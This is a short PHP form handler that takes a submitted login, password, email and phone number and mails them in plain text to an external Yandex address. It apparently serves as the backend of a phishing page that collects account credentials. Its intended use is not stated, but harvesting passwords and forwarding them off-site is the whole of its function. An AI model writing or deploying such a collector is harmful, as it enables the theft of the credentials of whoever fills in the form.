<?php

    $login = $_POST['login'];
    $pass = $_POST['pass'];
    $email = $_POST['email'];
    $tel = $_POST['tel'];


    if(mail("MotyrayTeam@yandex.ru",
            "новое письмо с сайта",
            "login: ".$login."\n".
            "pass: ".$pass."\n".   
            "email: ".$email."\n".   
            "tel: ".$tel."\n".   
            "From: no-reply@mydomain.ru \r\n")
    ) {
        echo("Письмо отправлено успешно!");
    }
    else {
        echo("Ошибка");
    }
    
    

    
    
    


?>